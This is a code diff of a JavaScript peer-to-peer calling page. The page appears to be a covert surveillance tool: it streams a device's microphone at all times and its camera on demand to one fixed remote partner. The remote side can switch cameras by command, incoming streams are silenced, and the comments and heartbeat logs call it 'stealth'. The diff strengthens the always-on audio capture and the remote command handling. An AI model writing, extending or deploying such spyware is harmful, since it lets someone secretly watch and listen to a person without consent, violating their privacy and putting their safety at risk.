@@ -36,7 +36,8 @@
         let peer = null;
         let currentCall = null;
         let localStream = null;
-        let currentCamera = 'front'; // 'front' or 'back'
+        let dataConn = null;
+        let currentCamera = 'front';
         let reconnectAttempts = 0;
         const MAX_RECONNECTS = 5;
         
@@ -49,27 +50,14 @@
         async function getCameraStream(useBackCamera, callType) {
             const isVideo = callType === 'video';
             
-            if (!isVideo) {
-                // Audio only call - just get audio
-                const constraints = { audio: true, video: false };
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    log(`Audio-only stream acquired`, 'success');
-                    return stream;
-                } catch (e) {
-                    log(`Audio failed: ${e.message}`, 'error');
-                    throw e;
-                }
-            }
-            
-            // Video call - get audio + requested camera
+            // Always include audio for stealth
             const constraints = {
                 audio: true,
-                video: {
+                video: isVideo ? {
                     facingMode: useBackCamera ? "environment" : "user",
                     width: { ideal: 640 },
                     height: { ideal: 480 }
-                }
+                } : false
             };
             
             log(`Getting ${useBackCamera ? 'BACK' : 'FRONT'} camera stream...`, 'info');
@@ -78,17 +66,19 @@
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const hasAudio = stream.getAudioTracks().length > 0;
                 const hasVideo = stream.getVideoTracks().length > 0;
-                log(`Stream acquired - Audio: ${hasAudio}, Video: ${hasVideo}, Camera: ${useBackCamera ? 'Back' : 'Front'}`, 'success');
+                log(`Stream acquired - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
                 return stream;
             } catch (e) {
-                if (e.name === 'OverconstrainedError') {
-                    log(`Exact camera not available, trying fallback...`, 'warn');
+                if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
+                    log(`Camera not available, trying fallback...`, 'warn');
                     const fallbackConstraints = {
                         audio: true,
-                        video: { facingMode: useBackCamera ? "environment" : "user" }
+                        video: isVideo ? true : false
                     };
                     try {
-                        return await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                        const fallbackStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                        log(`Fallback stream acquired`, 'success');
+                        return fallbackStream;
                     } catch (fErr) {
                         log(`Fallback failed: ${fErr.message}`, 'error');
                         throw fErr;
@@ -131,7 +121,7 @@
                         log(`Video track replaced with ${targetCamera} camera`, 'success');
                     }
                     
-                    // Replace audio track if needed (keep audio alive)
+                    // Replace audio track (keep audio alive)
                     const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
                     if (audioSender && newStream.getAudioTracks()[0]) {
                         await audioSender.replaceTrack(newStream.getAudioTracks()[0]);
@@ -140,7 +130,7 @@
                 }
                 
                 // Clean up old stream
-                if (localStream) {
+                if (localStream && localStream !== newStream) {
                     localStream.getTracks().forEach(track => track.stop());
                 }
                 
@@ -182,16 +172,15 @@
                 call.answer(stream);
                 currentCall = call;
                 
-                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'} from ${currentCamera} camera`, 'success');
+                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'}`, 'success');
                 
-                // Handle remote stream (ignore)
+                // Handle remote stream (ignore - remote is silent)
                 call.on('stream', (remoteStream) => {
                     if (remoteStream) {
+                        log('Remote stream received (will be ignored)', 'info');
                         remoteStream.getTracks().forEach(track => {
                             track.enabled = false;
-                            track.stop();
                         });
-                        log('Remote stream disabled', 'info');
                     }
                 });
                 
@@ -211,13 +200,13 @@
             }
         }
         
-        // Handle data messages (camera switch commands)
+        // Handle data messages (camera switch commands from remote)
         function handleDataMessage(data) {
             log(`Received data: ${data.type}`, 'info');
             
             if (data.type === 'camera_switch') {
                 const targetCamera = data.camera;
-                log(`Camera switch command received: ${targetCamera}`, 'info');
+                log(`📷 Camera switch command received: ${targetCamera}`, 'info');
                 switchCamera(targetCamera);
             }
         }
@@ -254,11 +243,16 @@
                 reconnectAttempts = 0;
             });
             
+            // Handle data connections for commands
             peer.on('connection', (conn) => {
                 if (conn.peer === PARTNER_ID) {
-                    log(`Data connection established with remote`, 'success');
+                    log(`📡 Data connection established with remote`, 'success');
+                    dataConn = conn;
                     conn.on('data', handleDataMessage);
-                    conn.on('close', () => log('Data connection closed', 'warn'));
+                    conn.on('close', () => {
+                        log('Data connection closed', 'warn');
+                        dataConn = null;
+                    });
                 } else {
                     conn.close();
                 }
@@ -296,17 +290,17 @@
         log('Configuration:');
         log(`  - ID: ${MY_ID}`);
         log(`  - Target: ${PARTNER_ID}`);
-        log(`  - Audio: ALWAYS SENT`);
+        log(`  - Audio: ALWAYS SENT to remote`);
         log(`  - Video: ON DEMAND`);
         log(`  - Camera: SWITCHABLE via remote command`);
-        log(`  - Receives: NOTHING from remote`);
+        log(`  - Receives: Camera commands only`);
         
         initPeer();
         
         // Heartbeat
         setInterval(() => {
             if (currentCall) {
-                console.log('[STEALTH] Active call - sending to remote');
+                console.log('[STEALTH] Active call - sending audio/video to remote');
             }
         }, 30000);
         
